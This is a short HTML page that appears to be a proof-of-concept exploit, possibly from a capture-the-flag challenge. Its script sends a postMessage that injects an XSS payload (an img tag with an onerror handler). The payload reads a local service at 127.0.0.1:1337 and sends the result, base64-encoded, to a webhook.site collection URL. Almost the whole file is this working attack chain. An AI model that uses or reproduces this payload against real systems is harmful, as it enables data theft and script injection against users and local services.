<!DOCTYPE html>
<html>
  <body>
    <!-- Step 1: Deprecated tag on the page -->
    <marquee>replace me</marquee>

    <!-- Step 2: JS to send your payload via postMessage -->
    <script>
    window.postMessage({
      type: "SET",
      replacementString: `<img src=x onerror="
        fetch('http://127.0.0.1:1337/')
        .then(r => r.text())
        .then(d => (new Image()).src = 'https://webhook.site/7e4fb045-6370-4b03-901b-340cbe8418e1/?x=' + btoa(d));
      ">`
    }, "*");
    </script>
  </body>
</html>
